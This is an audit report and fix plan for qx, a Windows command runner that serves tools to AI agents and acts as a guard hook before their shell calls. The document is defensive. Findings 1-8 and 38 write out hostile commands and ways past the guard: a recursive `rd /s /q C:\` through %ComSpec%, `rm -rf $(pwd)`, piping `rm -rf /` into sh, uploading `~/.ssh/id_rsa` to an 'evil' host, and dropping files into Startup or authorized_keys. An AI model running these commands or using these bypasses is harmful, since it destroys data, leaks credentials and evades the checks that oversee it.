# qx audit report and plan

**What this repo does:** qx is a fast command runner for Windows, written in Rust. It serves two tools, `run` and `fs`, over MCP (the Model Context Protocol agents use to call tools), and also works as a CLI and a Claude Code PreToolUse hook (a check that runs before each Bash call). The assumed load is one developer machine with several agent sessions at once. Each server runs up to 4 parallel tool calls, other agents edit the same tree, and RAM is tight (about 1 GB free in Gatcha.md).

All 40 findings below come from reading the code. Nothing was built or run, except one `cmd.exe` probe for finding 3.

## Findings

### Must fix

1. **A shell named by an environment variable is never judged** (src/guard.rs:160-300, 945-975)
   - What this is: The guard picks its rule from the program name. It never expands `%ComSpec%` or `$env:ComSpec` first.
   - Problem: `%ComSpec% /c rd /s /q C:\` and `& $env:ComSpec /c rd /s /q C:\` match no rule, so they are allowed. exec.rs:1997 shows models really write `& $env:ComSpec`. The `%SystemRoot%\System32\cmd.exe` form is already caught.
   - Fix: In `check_mode`, expand the program word first with the existing `expand_env(&expand_dollar_env(program))` before `base_name`. Add tests for both lines.
   - If we skip it: A model that tries can dodge every delete and egress rule.

2. **`rm -rf $(pwd)` is judged as a harmless word** (src/guard.rs:1646, 1651, 226-260)
   - What this is: Delete targets go through `peel()`, which strips `$(`, `)` and quotes.
   - Problem: `$(pwd)` becomes `pwd`, which resolves to `cwd\pwd` and is allowed. The `$(` expression check at 1651 never fires. The shell then deletes the real cwd or `/`. `"$(cd /; pwd)"` and backtick `pwd` do the same.
   - Fix: Run the expression check on the operand before `peel()`. Deny `$(` or `@(` unless the inner text starts with `$` or `~`, and deny any backtick. Keep `($env:X)` working. Leave the unresolved-variable Warn as Warn.
   - If we skip it: The promise "cwd and parents are protected" is false.

3. **A multi-line `cmd.exe` command silently runs only line 1 and exits 0** (src/exec.rs:587-610, 738-751, 799-825)
   - What this is: When `pick_shell` chooses cmd, the command goes in as `/d /s /c "text"`. `cmd.exe` stops reading at the first line feed.
   - Problem: Checked on this machine: `echo LINE1<LF>echo LINE2` prints LINE1 only and exits 0. A multi-line `cd /d X\nnpm test` has no PowerShell or POSIX marker, so it lands on cmd. The caller sees success for work that never ran.
   - Fix: In `build_shell`'s "cmd" branch, if `command.trim_end()` still contains `\n` or `\r`, then for auto choice use PowerShell, and for an explicit `shell:"cmd"` return an error. Add a two-line test.
   - If we skip it: Agents get exit 0 for scripts that half ran.

4. **PowerShell provider paths are answered as plain files** (src/builtin.rs:153-176, 49-51, 207-216, 456)
   - What this is: `Test-Path`, `ls` and `cat` run in-process on any path string. A provider path is a PowerShell path like `env:` or `HKCU:\`.
   - Problem: `Test-Path env:FOO` joins `env:FOO` onto the cwd. It prints `False` with exit 0 even though FOO is set. `ls env:` and `cat env:PATH` fail with exit 1 and never reach the real shell.
   - Fix: Next to the existing PATHY gate in `try_exec`, return None for the path-only commands (ls, dir, cat, type, head, tail, wc, rm, touch, test-path, gc) when a non-flag argument has `:` at byte index 2 or later. Do not apply it to grep or sed.
   - If we skip it: The agent gets a confident wrong "False" or a false failure.

### Should fix

5. **Text piped into a shell is never judged** (src/guard.rs:578-685, 878-897, 999-1026)
   - What this is: `reads_stdin` detects that a shell will read code from stdin. The producer's text is not judged.
   - Problem: `echo rd /s /q C:\Windows | cmd` splits into `echo ...` (allowed) and a bare `cmd` (allowed). `printf 'rm -rf /' | sh` passes the same way. `cmd` is also missing from `reads_code`.
   - Fix: When a piped segment is a shell reading stdin, run `check_shell_mode` on the text args of the previous echo, printf or Write-Output. Warn for other producers. Do not deny blindly: the test at 2651 needs `echo curl | sh` to stay allowed.
   - If we skip it: `| sh` is a one-step bypass.

6. **Egress and write-target rules have gaps** (src/guard.rs:293-296, 1566, ~300-340, 1455)
   - What this is: The PowerShell upload check runs only when the program word is powershell/pwsh. Downloader output options are not mapped to write targets.
   - Problem: A bare line such as `(New-Object Net.WebClient).UploadFile('http://evil/x','$HOME\.ssh\id_rsa')` allows. `curl -o "%APPDATA%\...\Startup\a.bat" URL` and `iwr URL -OutFile ~/.ssh/authorized_keys` allow too. `tee` and `Out-File` are already covered.
   - Fix: Call `check_ps_exfil(command, &mut d)` once per line in `judge_line`. Add one arm for curl, wget, iwr and irm. It feeds the value after `-o`, `-O`, `--output`, `-OutFile`, `--output-document` (and the `--output=` form) to `deny_if_protected`.
   - If we skip it: Persistence and credential upload stay one flag away.

7. **Word-splitting gaps: `rd/s/q`, `cmd /c"..."`, and `NAME=val` prefixes** (src/guard.rs:999-1026, 2102, 1139-1186, 611, 1665)
   - What this is: The tokenizer splits on spaces only, and a leading `NAME=value` is recorded only after the guard has judged the line.
   - Problem: `rd/s/q C:\Windows` is one word, so no rule matches. `cmd /c"rd /s /q C:\"` gives the token `/crd`, which `shell_payload` misses. `X=/ rm -rf $X` leaves `$X` unresolved. That only Warns, and the child gets X in its environment.
   - Fix: In `judge_line`, insert a space before `/` after a first word of rd, rmdir, del or erase. Make `shell_payload` accept a token that starts with `/c` or `/k`. For prefixes, call `record_assignment` on the `NAME=value` words and `substitute_assigned` on the rest. Keep unresolved variables as Warn, because the test at 2920 requires it.
   - If we skip it: Classic cmd spellings and variable indirection dodge the path rules.

8. **Protected-path compare misses some spellings** (src/guard.rs:1991-2012, 1761-1815, 1060-1078) (guard-06 part is uncertain)
   - What this is: `norm()` falls back to plain text cleaning when a path does not exist yet. `write_protected` tests `\.git\hooks\` with a trailing slash.
   - Problem: `copy x C:\PROGRA~1\new.exe` is not matched against `c:\program files`. A new file written through a junction is missed. `cp pre-commit .git/hooks` (the directory itself as destination) is not protected. `\\.\C:\Windows\new.txt` is only caught if the leaf exists.
   - Fix: In `norm`, when canonicalize fails, canonicalize the longest existing parent and append the cleaned rest (about five lines). For hooks use `s.ends_with("\\.git\\hooks") || s.contains("\\.git\\hooks\\")`. Optionally map `\\localhost\X$` to `X:`.
   - If we skip it: A write into a protected folder passes by choosing an unusual spelling.

9. **Inline python is falsely denied for `shutil`** (src/guard.rs:1584-1620, line 1603)
   - What this is: `check_code` counts the word `shutil` alone as destructive.
   - Problem: `python -c "import shutil,subprocess; print(shutil.which('git')); subprocess.run(['git','--version'])"` is denied at 1612. The model cannot rephrase past the guard.
   - Fix: Delete the `|| l.contains("shutil")` line. `rmtree` is already a separate term. This removes code.
   - If we skip it: Harmless environment probes get blocked, and users switch `QX_GUARD` off.

10. **`fs` write/edit with no cwd uses the last cwd of any session** (src/fsops.rs:102, 389-397, 177-181)
   - What this is: `Root::new` falls back to the process-global `LAST_CWD`.
   - Problem: Session A sets cwd=ProjectA. Session B then calls `write path=src/main.rs` with no cwd. A new file lands in ProjectA. `ensure_inside` passes because ProjectA is a valid root. Observations are keyed by path only, so a read by another agent can also satisfy the "read first" rule. The "no cwd given: used X" note comes after the write.
   - Fix: In write and edit, return an error "pass cwd" when cwd is absent and the path is relative. Keep the fallback for reads. `run` has the same exposure and is not covered by this fix.
   - If we skip it: Cross-project overwrite when the model forgets cwd.

11. **grep can report wrong results: a dead panic flag and phantom matches** (src/fsops.rs:1885, 1917-1921, 1987, 2152-2193, 2266)
   - What this is: `panicked` is read at 1987/1997 but never set. Line splitting adds an empty last segment.
   - Problem: A panicking worker drops all its files' matches with no note. There is no known trigger, so this is a dead safety net. Separately, `^$` or `x*` reports line 3 on a 2-line file, line 1 on an empty file, and drifts at each 4 MB chunk end in `scan_stream`. `read` disagrees.
   - Fix: Use `match h.join() { Ok(v) => out.extend(v), Err(_) => panicked.store(true, Relaxed) }`. In `scan_text` strip one trailing `\n` and return early on empty text. In `scan_buffer` skip a match at `text.len()` after a final `\n`.
   - If we skip it: Rare bogus `file:N` hits and a false "no matches".

12. **grep on a file with no newline buffers the whole file** (src/fsops.rs:2230-2279)
   - What this is: `scan_stream` keeps an unfinished-line buffer called the carry.
   - Problem: A one-line file between 8 MB and 512 MB (minified bundle, JSON dump) grows the carry to the file size per worker thread. Files above 512 MB are skipped. With about 1 GB free this is plausible.
   - Fix: In both paths, once the carry passes about 1 MB without `\n`, scan that prefix as one clipped line and discard until the next `\n` while counting lines. The slow path needs `take(CAP).read_until`.
   - If we skip it: One odd file can exhaust RAM during a repo-wide grep.

13. **grep clips the head of a line, not the part around the match** (src/fsops.rs:1253, 2163, 1947-1963)
   - What this is: `clip_line` keeps the first N characters.
   - Problem: On a minified line with the hit at column 2500 and the default limit of 2000, the shown text does not contain the match. This wastes tokens and loses the information. Total output is bounded (about 500 KB by default), so the byte cap is only a tuning choice.
   - Fix: Window the clip around the first match, with half the budget either side and an ellipsis at each cut. Optionally add a 64 KB total limit with the existing "showing N of M" note.
   - If we skip it: Grep on minified files shows lines that do not contain the hit.

14. **glob patterns with `./` or an absolute prefix silently match nothing** (src/fsops.rs:1613-1625, 1806)
   - What this is: `glob` only flips `\` to `/` and expands braces.
   - Problem: `./src/**/*.rs` and `C:/proj/src/**/*.rs` give "No files found." The same holds for grep's `include`.
   - Fix: Strip leading `./` segments. For an absolute pattern under the root, strip the root prefix. Otherwise return an error "pattern must be relative to path".
   - If we skip it: A common agent pattern reads as "no such files".

15. **Startup priming can hydrate OneDrive files** (src/fsops.rs:102-159, src/warmup.rs:24-25)
   - What this is: On start, qx reads small files under the cwd into a cache.
   - Problem: With cwd = home or a drive root, `fs::read` on a cloud-only placeholder triggers a download. It is bounded at 60,000 entries and 64 MB per new directory, in a background thread. It is a nuisance, not unbounded.
   - Fix: In `prime`, return when `dir.parent().is_none()` or the dir equals `home_dir()`. Skip files with attributes 0x400000, 0x40000 or 0x1000.
   - If we skip it: Starting a session in the wrong folder downloads cloud files.

16. **Cancelling a status poll kills the background job** (src/mcp.rs:636-658, 772-820, 253, 805, 661)
   - What this is: A long `run` becomes a background job, and later calls poll it with `job=<id>`.
   - Problem: `JobRec::wait` stores the job's own cancel flag when the poll is cancelled, so the build is killed. Esc during a 60 s poll destroys a 20-minute build. The comment at 661 says this must not happen. No test covers jobs: promotion, cap of 6, retention of 16, kill, double poll, unknown id.
   - Fix: Give `wait` a `stop_on_cancel` flag, true only for the first `run` call. Polls pass false and return the "still running" reply on cancel. Add small tests using a tiny soft window and sleep commands.
   - If we skip it: A cancelled poll costs a full rerun, and the job feature stays untested.

17. **A failed thread spawn kills the whole MCP session** (src/mcp.rs:111, 663-687)
   - What this is: Each call spawns a worker with `thread::spawn`, which panics when the OS refuses.
   - Problem: Under tight memory the panic unwinds the reader loop and every in-flight call dies with no reply. `spawn_runner` already handles this with `Builder`.
   - Fix: Use `thread::Builder::spawn`. Read the request ids before moving `req`. On Err, `active.fetch_sub(1)` by hand and reply "could not start a worker thread" for each id.
   - If we skip it: One failed spawn drops the whole session.

18. **Sub-folder cwds evict the workspace index** (src/index.rs:463-493, 486-488; src/fsops.rs:122-129)
   - What this is: `ensure()` returns early only when the lookup gives an empty prefix. Each cwd gets its own index and watcher, and the registry holds 4 roots.
   - Problem: Working in `C:\proj\sub`, then `C:\proj`, then 2 more folders evicts the oldest, usually the real root. Nothing rebuilds it, so root queries live-walk for the rest of the process. Each extra watcher costs a 256 KB buffer plus a snapshot.
   - Fix: In `ensure()`, return when an ancestor index exists and the path in between crosses no skipped folder name (node_modules, target). Keep creation-order eviction, or touch a timestamp in `find()` for LRU.
   - If we skip it: Slower `fs` and more RAM after a few cwd changes.

19. **bash/sh run as a program get unquoted args** (src/exec.rs:426-434)
   - What this is: This branch uses `c.args(args)`. The sibling paths use `add_args`, which applies `msys_quote`.
   - Problem: The test at 2303-2307 shows MSYS mangles space-free args like `f*.txt`, `a{2}`, `don't`, `@x`. `program:"bash" args:["script.sh","f*.txt"]` gets globbed.
   - Fix: Replace `c.args(args);` with `add_args(&mut c, args);` at exec.rs:429. Add a test comparing a literal `f*.txt` argument.
   - If we skip it: Rare, hard-to-diagnose mangled arguments.

20. **The hook ignores Claude's Bash timeout, and buffered output is lost on kill** (src/hook.rs:36-75, 464-518; src/main.rs:54)
   - What this is: The hook prefixes stages with `qx `, which buffers output. It never reads `tool_input.timeout`, and qx has no timeout of its own.
   - Problem: `cargo test` with a 60 s timeout and a 90 s suite: Claude kills the tree at 60 s, and the output qx held is lost. Claude's default 120 s applies when the model passes nothing, which is the common case.
   - Fix: In `respond()`, for the captured form only, use `tool_input.timeout`, else `BASH_DEFAULT_TIMEOUT_MS`, else 120000. Pass `--timeout max(1, ms/1000 - 2)`. Skip when plan() already set `--timeout` and for `--stream` stages.
   - If we skip it: Every Claude timeout on a captured command returns nothing.

21. **Diffs of 201-400 lines are cut by the generic compaction** (src/digest.rs:55; callers src/mcp.rs:1110, src/main.rs:422)
   - What this is: Digest returns None for diffs of 400 lines or fewer ("show as git printed it"). The generic `compact(200,80,60)` then runs.
   - Problem: A 250-line diff keeps 80 head and 60 tail lines, and the middle goes. A 401-line diff is shown more fully. A `[qx] lines omitted` marker is printed, and the text is spooled.
   - Fix: Keep 400 and pass a 400-line budget to `compact` for diff labels at mcp.rs:1110 and main.rs:422. Lowering the threshold to 200 would also drop headers and context.
   - If we skip it: The agent edits against a partial mid-size diff.

22. **Built-in grep, wc and cp ignore cancel and timeout while scanning** (src/builtin.rs:1294-1395, 1418-1442, 1724-1730; src/main.rs:253, 287)
   - What this is: The walk checks `should_stop()`, but the per-file loop and `count_file` do not.
   - Problem: `grep -rn x D:\data` over thousands of large files cannot be cancelled until the scan ends, and holds one of 4 workers for minutes. `qx --timeout 5 grep -r` is unbounded on the CLI, because only mcp.rs calls `set_deadline`.
   - Fix: Add `if crate::exec::should_stop() { return None; }` at the top of each `'files` iteration. In `count_file` check per 64 KiB chunk and return an Interrupted error, mapped as `cmd_rm` does at 1671. `run_direct` already maps it to exit 124.
   - If we skip it: A runaway grep starves other sessions.

23. **Built-in grep gives up too often, after wasted work** (src/builtin.rs:49-51, 1094-1189, 1235, 1296-1304)
   - What this is: Options are parsed only before the pattern, any binary file declines the whole call, and a pattern starting with `/` hits the path gate.
   - Problem: `grep -rn foo src -i` walks `src`, fails on `-i` and spawns the real grep. `grep -rn x .` in a repo reaches `.git` objects (NUL bytes) and drops the whole result. `grep -rn "/api/users" src` always spawns. `--include=` reaches this code only via program+args.
   - Fix: Run `fs::metadata` on every operand before the first walk and decline early. Keep parsing flags after the pattern. For a binary file, decline only when `-v` is set, the pattern is non-ASCII, or the lossy text contains the needle; otherwise count it as no match. Skip the `/` gate for the pattern word.
   - If we skip it: The 50 ms win is paid twice (scan, then spawn) on common agent searches.

24. **`cp` keeps the source's old modified time** (src/builtin.rs:1702, 1717, 1840)
   - What this is: `std::fs::copy` on Windows is CopyFileExW, which keeps the last-write time. GNU `cp` stamps the current time.
   - Problem: Restoring `lib.rs` from an older backup gives a source older than the build's dep-info. Cargo and make skip the rebuild and ship a stale binary. Not run here.
   - Fix: After `fs::copy` of a regular file in `copy_rec`, open the destination for write and `set_modified(now)`, ignoring failure. `move_across` keeps the source time. A read-only source leaves the old time.
   - If we skip it: "My change did not take effect" after a clean `cp`.

25. **`ls` shows wrong paths and UTC times** (src/builtin.rs:443-475, 456, 710-746; src/fsops.rs:2408)
   - What this is: For a file operand `list_one` prints only the file name. `format_time` has no zone offset, and mode bits come from the extension.
   - Problem: `ls src/main.rs` prints `main.rs`. `ls a/x.txt b/y.txt` prints `a/x.txt:` headers. One bad operand discards all other listings. On a UTC+8 machine a file saved at 10:00 shows 02:00. A read-only file is shown as writable.
   - Fix: Print file operands as typed, and use `{p}:` headers only for directories. On error, push to stderr, set the exit code and continue. Label times `UTC` in `ls -l` and `fs stat`, and take the `w` bit from `permissions().readonly()`.
   - If we skip it: Agents read wrong locations and hours-off "newer file" answers.

26. **head/tail on UTF-16 files, and the silent 32 MiB cap** (src/builtin.rs:945-1000)
   - What this is: `head` decodes each line slice alone. `tail` decodes a mid-file window with no BOM. Both stop at 32 MiB without a marker.
   - Problem: PowerShell 5.1 `>` writes UTF-16LE. `Get-Content out.txt -TotalCount 3` keeps a stray CR on line 1 and turns non-ASCII on later lines into U+FFFD. `tail -n 1000000 huge.log` returns fewer lines with exit 0.
   - Fix: In `read_head_tail`, read the first 2 bytes. On FF FE or FE FF use `read_text_capped`, or return None. When the window was cut, return None so the real tool answers, or add a `[qx] cut at 32 MiB` line like `cat`.
   - If we skip it: Wrong or short text with no error.

27. **`seq` drops its last value, and `realpath` fails on a new file** (src/builtin.rs:2083-2094, 2022-2036)
   - What this is: `seq` counts with floating-point division. `realpath` calls `canonicalize`.
   - Problem: `seq 0.1 0.1 0.3` and `seq 0 0.1 0.3` stop one short. `realpath build/out.txt` exits 1 when only the last component is missing, but GNU prints the absolute path.
   - Fix: `count = ((last-first)/step + 1e-9).floor() + 1.0`. On NotFound, canonicalize the parent and join the file name, reusing the loop in `into_self`.
   - If we skip it: Decimal loops lose an iteration, and "absolute path of the file I will create" errors.

28. **`qx setup` rewrites the qx entry and drops the user's own keys** (src/setup/toml.rs:30-55, 86-117, 157-170; src/setup/yaml.rs:293-303, 332-348; src/setup/mod.rs:308-348; pi.rs:88-94)
   - What this is: Codex, Hermes, OpenCode, Claude and pi entries are rebuilt from a template. Only the env block (plus the OpenCode timeout) is kept.
   - Problem: Codex loses `enabled`, `enabled_tools`, `cwd`, tuned `tool_timeout_sec` and any `[mcp_servers.qx.tools.*]` subtable. In Hermes, a `tools:` block after `env:` is moved under `env:` as a junk variable named `include`, `tools:` is dropped, and timeouts reset to 600/60. OpenCode `enabled:false` and in-entry comments vanish. README documents only the env keys.
   - Fix: Rewrite in place. Keep every existing non-env line and subtable, and replace only `command`, `args` and the `QX_CLIENT` line (as `edit_dsh` does). If that is too much, refuse any entry with other keys. Decide on purpose whether `enabled` is forced.
   - If we skip it: Every setup run silently resets hand-tuned settings and approvals.

29. **Valid configs are refused: BOM and a comment after a key** (src/setup/jsonc.rs:246-254, 402-428; mod.rs:255-279; src/setup/yaml.rs:136-139, 252-255, 295-298)
   - What this is: `first_value` does not step over a leading U+FEFF. The YAML editors compare the text after a key with `""` or `{}` only.
   - Problem: A `settings.json` saved by PowerShell 5.1 `Set-Content -Encoding UTF8` gives "not an object" with no file name, and `qx doctor` says "not registered". `mcp_servers:  # note` or `env:  # vars` is refused as "flow-style mapping" on every run. Both fail safe.
   - Fix: In `first_value`, step over a leading BOM and name the file in the refusal. Add a helper that cuts a ` #...` comment before the empty/`{}` check at all three YAML sites. Add one test per case.
   - If we skip it: Hand-edited configs cannot be managed.

30. **Setup and doctor trust a hook or exe that may not exist** (src/setup/mod.rs:160-166, 399-405, 563-569; src/doctor.rs:194-228)
   - What this is: `is_qx_hook` matches on file stem and args only. `setup` writes `deploy::canonical()` without checking the file.
   - Problem: A hook pointing at `C:/old/qx.exe` shows `claude-code ok`, while every Bash call spawns a missing exe and runs unguarded. On a fresh clone, `cargo build --release; qx setup all` registers a path that does not exist. The live hook uses forward slashes, setup writes backslashes.
   - Fix: In `status()`, normalise the hook command (slashes, case) and compare it with the canonical path. Report drift or a missing file. In `plan`, when action is Install, require `exe.is_file()`: error with exit 2, or a warning under `--dry-run`. Leave `--remove` unchecked.
   - If we skip it: Doctor says "ok" while the guard is off.

31. **Upgrading pi leaves the old extension running beside the new MCP entry** (src/setup/pi.rs:74-153; integrations/pi/qx.js:68-87; bridge.js:154-169)
   - What this is: The pi >= 0.99 branch writes only `mcp.json`. The older branch writes `extensions/qx.js` and the bridge. Neither removes the other half.
   - Problem: `~/.pi/agent/extensions/qx.js` exists here now. After a pi upgrade there are two qx servers. Separately, the extension never calls `bridge.close()`, so a pi reload leaves an orphan `qx.exe` (about 10 MB).
   - Fix: In the >= 0.99 branch, return `Edit::Changed(String::new())` for the three legacy files when they exist, for Install and Remove. In `qx.js` add `pi.on("session_shutdown", () => bridge.close())` after checking the event exists in the pi version here.
   - If we skip it: Two servers, and possibly duplicate tool names.

32. **The CI clippy gate is red, and the toolchain floats** (src/exec.rs:1116, 1729; src/fsops.rs:1891; .github/workflows/ci.yml)
   - What this is: CI runs `clippy --release --all-targets --locked -D warnings` on floating `stable`.
   - Problem: Three lints fail today (Handoff.md:9): a complex thread-local type, `map_or(false, ..)` and `map_or(true, ..)`. A red gate gets ignored, and a new Rust release can turn green to red with no code change.
   - Fix: Add a type alias for the slot at exec.rs:1116. Use `.is_ok_and(|s| s.len() < PARKED_TARGET)` at 1729. Use `m.is_none_or(|m| content_get(p, m).is_none())` at fsops.rs:1891. Both helpers fit MSRV 1.82. Pin the toolchain version in ci.yml.
   - If we skip it: CI stays red, so the next real regression hides.

33. **Flaky tests** (src/mcp.rs:1322-1365, 1446, 1693-1749, 1862; src/client.rs:245-277) (the EOF test cause is uncertain)
   - What this is: `initialize_carries_routing_instructions` calls `handle(initialize)`, which writes the global client (mcp.rs:396) without the lock. `a_non_string_argument...` runs without `server_lock`. The EOF test assumes the first call in INFLIGHT owns the spawn slot.
   - Problem: The unlocked test overwrites the global between the other test's set and assert (the value is Generic or ClaudeCode, not "Dsh"). A leftover SHUTDOWN flag cancels the unlocked test's second call. In the EOF test the first registered call need not hold the slot, but ping may also fail in the sandbox. Handoff says 2 of 3 solo runs failed.
   - Fix: Add `let _global = client::lock_global();` to the first test and `let _server = server_lock();` to the second. For the EOF test, wait until the spawn gate shows zero free slots before sending EOF. Do not assert "one running, one queued", because both may be cancelled.
   - If we skip it: Red runs that nobody trusts.

34. **Parked PowerShells never expire** (src/exec.rs:1613-1742, 1625, 1668-1675; src/warmup.rs:27-31) (partly uncertain: the RAM figure is not measured)
   - What this is: Each qx server keeps 2 warm `powershell.exe` so the next PowerShell call starts in 45-70 ms instead of 570-1200 ms.
   - Problem: With several sessions, that is 8 to 12 idle hosts, roughly 30-60 MB each. Nothing is respawned per tick; `fill` only spawns when one died or was taken. Idle expiry makes the first call after idle cold again, and the user ranks latency above RAM.
   - Fix: Measure one parked host first. If it is large, add a last-take `Instant` checked in `top_up` and drop parked hosts after 15-30 minutes idle. Keep the target at 2, because burst calls need both.
   - If we skip it: A constant RAM tax per session on a tight machine.

35. **No `qx setup cursor`** (src/client.rs:12-20, 73-80, 96-107; src/setup/mod.rs:71-137, 537-540)
   - What this is: Cursor is not a `Client` variant, so `qx setup cursor` exits 2 "unknown client".
   - Problem: `~/.cursor/mcp.json` has no qx. `cli-config.json` has `approvalMode: "allowlist"` with `Shell(ls)` and one `Mcp(...)` entry, so `cargo test` waits on an approval nobody answers (inferred from config, not seen in a Cursor log). In allowlist mode an `Mcp(qx:run)` rule is needed too, or the prompt just moves. Handoff.md:12 lists this as pending.
   - Fix: Do a spike first: confirm `Mcp(qx:*)` wildcard support, Cursor's `clientInfo.name` and its native tool names. Then add a `Client::Cursor` variant to every exhaustive `match Client` (tool_id, native names, structured, detect, installed, status, plan) and the tests at client.rs:318 and 342. Rely on `QX_CLIENT=cursor`. Write both `mcp.json` and the allow entries. Skip `hooks.json` until its semantics are checked.
   - If we skip it: Cursor agents keep stalling and never get qx's guard, compaction or fast spawn.

### Nice to have

36. **Docs and help text disagree with the code** (src/main.rs:700-712; README.md:192, 641; Gatcha.md:31, 34; QX.md; src/doctor.rs:108-114)
   - What this is: Several notes are stale.
   - Problem: Help says `QX_MCP_WORKERS` default 4, but the code says 8 (mcp.rs:27, clamp 1-32). `QX_MCP_QUEUE` (64), `QX_WARM`, `QX_PS_WARM` and `QX_INDEX` are undocumented. README says "One dependency" (there are two). Gatcha says "fs grep is literal" (it is regex, with an invalid-regex fallback and `literal:true`). Gatcha line 31 says `edit` needs a prior read (only `write` does). README:192 still says "except Claude Code and Codex". QX.md says output is redacted, but `fs` replies are not (mcp.rs:871-873), and that is a decision to document. `qx doctor` reads the guard mode from its own shell, not the clients' env.
   - Fix: Edit those lines. Label the doctor lines `this shell:`. Print one warning in `Limits::from_env` when a set variable does not parse.
   - If we skip it: Agents and users act on wrong rules.

37. **Lean deletions** (src/fsops.rs:1766-1775, 2206, 2300, 689-724; src/builtin.rs:1299-1317; src/setup/*)
   - What this is: Code that repeats something else or does nothing.
   - Problem: `Matcher::Lit` plus `contains_ascii_ci` duplicate a regex built from `regex::escape`. Concrete bug: literal+ignore_case needle `é` is found in the prefilter but rejected on `É` by the ASCII-only compare. `ObsKey`'s first element is always empty, and `_cwd` is unused in `remember` and `check_observed`. Built-in grep copies each file twice (`decode` after `from_utf8`). Setup has `Paths.local_app_data`, the always-`None` tuple element of `opencode_file`, `let _ = block_line;`, `let _ = close;`, `indent_at`, an always-true `allow_comments`, `pi_version(_p)`, stale `#[allow(dead_code)]` at client.rs:72 and 83, and `yaml_path` vs `yaml_scalar_path`.
   - Fix: Make `Matcher` one regex built from `RegexBuilder::new(&regex::escape(needle)).case_insensitive(ic)` and delete the rest. Use `String::from_utf8(bytes).ok()?` in built-in grep. Drop the setup leftovers (test `Paths` constructors and call sites change too). Run clippy `-D warnings` afterwards.
   - If we skip it: More code and test cases for no gain. Unicode case folding stays inconsistent.

38. **Smaller redaction and guard-list gaps** (src/redact.rs:198-227, 163-187, 430, 493; src/main.rs:384; src/guard.rs:1050, 1325-1422)
   - What this is: Edge cases of the secret masking and the launcher list.
   - Problem: `postgres://app:s3cr#etPass@db/x` leaks the whole password. The stop set exists for `http://localhost/@scope/pkg`, so a "last @" fix would break it. `curl -u admin:hunter2` is not masked, but curl does not echo it, so this needs `ps` or CI logs. A PEM body is unmasked when the 64 KB peek starts mid-key. `--stream` runs are not redacted, which is the same text an unwrapped command shows; redacting all `--stream` runs would corrupt mid-pipeline data. `perl -e`, `ruby -e`, `php -r`, `env -S`, `forfiles /c`, `pcalua` are not judged. Any script file already bypasses a guard like this.
   - Fix: Drop `?` and `#` from the stop set at redact.rs:210. Mask the value after `-u` or `--user`. In `running_reply`, mask leading full-width base64 lines when the peek is not from byte 0. Add perl, ruby, php and lua to `inline_code` and handle `env -S`. Leave `--stream` alone.
   - If we skip it: Part of a password or key can reach the model, and the launcher list stays open.

39. **Small speed, RAM and token wins** (src/fsops.rs:1851-1881, 780, 856, 1000, 1011-1020, 2938-2951, 2020-2072; src/index.rs:327-357; src/mcp.rs:70, 690-705, 1073-1124; src/compact.rs:64-92; src/digest.rs:1266-1301)
   - What this is: Each item is modest; none is a correctness bug.
   - Problem: (a) The `include` filter runs after every path is collected, but `scan_capped` uses the pre-filter count, so moving the filter breaks cap detection. (b) `fsync` runs under the global write lock; the temp content depends on the read made under it, so it cannot move out simply. (c) `read` loads and hashes a 4-32 MB file for a small window; the hash cannot be made lazy. (d) `glob_general` allocates a memo per candidate file. (e) The content cache stops caching once it reaches 128 MiB and never evicts. (f) `add_tree` does a `Vec::insert` per file, so copying a big folder into a 200k index costs O(N x len). (g) Line 70 copies each input line once. (h) 16 finished jobs can pin up to 32 MiB each if left unpolled. (i) Non-full replies have no total byte cap, and 200 lines of 4000 characters give about 800 KB. (j) `interesting()` allocates a lowercase copy per line and misses `no such file`, `not recognized`, `refused`, `killed`, `out of memory`, `aborted`. (k) `json_min` builds a full tree, bounded by the 16 MiB capture.
   - Fix: (c) Lower the full-load threshold to 4-8 MB and accept the native-tool fallback for writes. (d) Compile the pattern once per call and reuse a buffer. (e) Clear the map when the cap is hit. (f) Sort and merge new entries once. (g) Avoid the copy by keeping the borrowed `Cow`; `String::from_utf8(buf)` would not compile because `buf` is reused. (h) Keep 4 results and expire unpolled ones after 10 minutes. (i) `cap_text(64 KB)` per stream before the spool decision at mcp.rs:1116. (j) Add only the six markers above and skip the allocation when the line has no uppercase byte. (k) Use `serde::de::IgnoredAny` (this needs a direct `serde` dependency).
   - If we skip it: Slower or larger on very big trees and rare flood output.

40. **Small robustness items** (src/index.rs:367-493; src/mcp.rs:866-1069, 636-658; src/fsops.rs:801-996; src/compact.rs:223; src/deploy.rs:93-185; src/setup/mod.rs:139-146, 357-384; src/setup/toml.rs:13-22; src/resolve.rs:567-575; src/hook.rs:937; .github/workflows/ci.yml) (some are uncertain, see below)
   - What this is: Rare failures and missing coverage.
   - Problem: (a) A panic in `build()` leaves `BUILDING` set and every query stalls 2 s; the trigger is unlikely, since OOM aborts. (b) `fs` calls ignore `notifications/cancelled`; this burns CPU but takes no process slot. (c) Two parallel polls of one job: the loser waits out `wait_ms` and says "still running". (d) A hard kill leaves `.qx-tmp-<pid>-<seq>` files in the source tree. (e) The spool keeps the newest 40 files shared by all processes, so one noisy run can evict another session's `full_output`. (f) `qx deploy` sweeps `.old-<ts>` before it knows it will install, and a failed copy leaves `qx.exe.new-<pid>`. (g) `setup apply` skips `sync_all`, overwrites `.qx-bak` on every changing run, and deletes on empty with no copy. (h) `[mcp_servers.'qx']` is not recognised, so a duplicate table is appended. (i) `CLAUDE_CONFIG_DIR` is ignored by setup and doctor (empty here, so no live case). (j) `norm_path_str` does not strip a `\\?\` prefix (uncertain: not verified that rustup writes it). (k) Any `Read`/`Edit`/`Write` rule disables the hook on purpose. (l) Hook and `apply` have no tests. (m, uncertain) The Index "reparse point breaks the whole index" case is wrong as stated; only a cloud placeholder file might trigger it. (n, uncertain) CI tests release only. The concrete example does not hold, so skip that one. (o) CI has no `timeout-minutes`, and the MSRV job builds only the bin. (p, uncertain) `deploy` has no rename retry for a Defender lock; add one only if it is seen.
